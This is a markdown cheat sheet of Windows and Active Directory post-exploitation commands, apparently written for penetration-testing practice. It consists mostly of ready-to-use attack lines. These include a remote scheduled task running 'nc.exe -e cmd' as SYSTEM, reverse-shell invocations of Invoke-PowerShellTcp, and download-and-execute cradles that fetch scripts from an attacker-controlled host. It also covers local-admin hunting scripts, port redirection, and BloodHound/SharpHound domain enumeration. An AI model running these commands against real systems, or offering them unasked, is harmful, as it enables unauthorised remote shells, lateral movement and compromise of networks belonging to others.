## Tools and Tricks

- [gwmi Commands](#gwmi-commands)
- [Schedule Tasks in Remote Computer](#schedule-tasks-in-remote-computer)
- [Invoke-PowerShellTcp.ps1](#invoke-powershelltcpps1)
- [Find-PSRemotingLocalAdminAccess.ps1](#find-psremotinglocaladminaccessps1)
- [Find-WMILocalAdminAccess.ps1](#find-wmilocaladminaccessps1)
- [Enter-PSSession](#enter-pssession)
- [Invoke-Command](#invoke-command)
- [WinRS.exe](#winrsexe)
- [Loader.exe](#loaderexe)
- [CMD Intersting Commands](#cmd-intersting-commands)
    + [Task Scheduling](#task-scheduling)
    + [Port Redirection](#port-redirection)
- [File Copy Using Powershell](#file-copy-using-powershell)
- [Run WMI Commands](#run-wmi-commands)
- [BloodHound](#bloodhound)


### gwmi Commands
---
```powershell
PS C:> gwmi -class win32_operatingsystem -ComputerName <computer_fqdn>
```

### Schedule Tasks in Remote Computer
---
```powershell
# Create the task
C:> schtasks /create /S <host_fqdn> /SC Weekly /RU “NT Authority\SYSTEM” /TN “<TASK_NAME>” /TR “C:\Users\Public\Downloads\nc.exe -e cmd <IP> <PORT>”

# Run the task
C:> schtasks /Run /S <host_fqdn> /TN “<TASK_NAME>”
```
### Invoke-PowerShellTcp.ps1
---
Opens a shell. Modified Version of the original `Invoke-PowerShellTcp_Old.ps1`. Replacing the main function name to `Power`.

Parameters:
- `Reverse`: To open reverse shell
- `Bind` : Creates a bind shell
- `IPAddress`
- `Port`

Example:
```powershell
C:> . Invoke-PowerShellTcp.ps1      
C:> Power -Reverse -IPAddress 192.168.1.1 -Port 1111
```
To download and run from memory, both options:
```powershell
C:> powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress <IP> -Port 443
C:> powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress <IP> -Port 443
```

### Find-PSRemotingLocalAdminAccess.ps1
---
To search for local admin access on machines in a domain or local network for the current user.
Parameters:
- `ComputerFile`: File with computers to check
- `StopOnSuccess`: Stops when found one
Example:
```powershell
PS C:> . .\Find-PSRemotingLocalAdminAccess.ps1       # Import module
PS C:> Find-PSRemotingLocalAdminAccess               # Run the function
COMPUTER-WITH-ACCESS
PS C:>
```
### Find-WMILocalAdminAccess.ps1
---
Runs a WMI command against the sepcified list of computers. Since, by-default, we need local administrative access on a computer to run WMI commands, a success for this fucntions means local administrative access.

parameters: Same as previous tool
```powershell
PS C:> . .\Find-WMILocalAdminAccess.ps1
PS C:> Find-WMILocalAdminAccess
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA544
Version         : 10.0.14393
The current user has Local Admin access on: SERVER.domain.local
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA549
Version         : 10.0.14393
The current user has Local Admin access on: COMPUTER.domain.local
PS C:>
```
### Enter-PSSession
---
Starts an interactive session with a single remote computer. During the session, the commands that you type run on the remote computer, just as though you were typing directly on the remote computer. You can have only one interactive session at a time.
```powershell
C:> Enter-PSSession <host>
C:> Enter-PSSession -ComputerName <host>
```
### Invoke-Command
---
Runs commands on a local or remote computer and returns all output from the commands, including errors.
```powershell
C:> invoke-command -ComputerName WCOMPUTER -ScriptBlock {whoami}

# Created Session
C:> $sess = New-PSSession <host>
C:> Invoke-Command -ScriptBlock {whoami}.ps1 -Session $sess
```
### WinRS.exe
---
```powershell
C:> winrs.exe -r:COMPUTER cmd
```
### Loader.exe
---
```powershell
C:> Loader.exe -path http://<ip>/<file>.ps1
```
### CMD Intersting Commands
---
##### Task Scheduling
---
```powershell
# Create task to run a reverse shell
C:> schtasks /create /S <host> /SC Weekly /RU "NT Authority\SYSTEM" /TN "<task_name>" /TR "powershell.exe -c 'iex (New-ObjectNet.WebClient).DownloadString(''http://<IP>/Invoke-PowerShellTcpEx.ps1''')'"

# Force task to run
C:> schtasks /Run /S <host_fqdn> /TN "<task_name>"
```
##### Port Redirection
```powershell
# Redirect connection to local ip and port to remote ip andp ort
C:> netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=<local_IP> connectport=<remote_port> connectaddress=<remote_IP>"
```
### File Copy Using Powershell
```powershell
# From a URL to a file
C:> iwr http://<IP>/Loader.exe -OutFile C:\Users\Public\Loader.exe
```
### Run WMI Commands
---
```powershell
C:> gwmi -Class win32_computersystem -ComputerName dcorp-dc
```
### BloodHound
---

Setup:
- Install and run neo4j:
```powershell
C:> neo4j.bat install-service
C:> neo4j.bat start
```
- Go to http://localhost:7474 and log using `neo4j` and `neo4j`.
- Change the password for `neo4j` user to the desireed one
- Run `BloodHound.exe` from `BloodHound-win32-x64`
- Will ask for credentials: bolt://localhost:7687  -  neo4j  -  PASSWORD

Run Collectors:
- Powershell:
```powershell
C:> . .\SharpHound.ps1
C:> Invoke-BloodHound -CollectionMethod All -Verbose
```
To avoid asking DC, use:
```powershell
C:> Invoke-BloodHound -CollectionMethod All -ExcludeDC
```
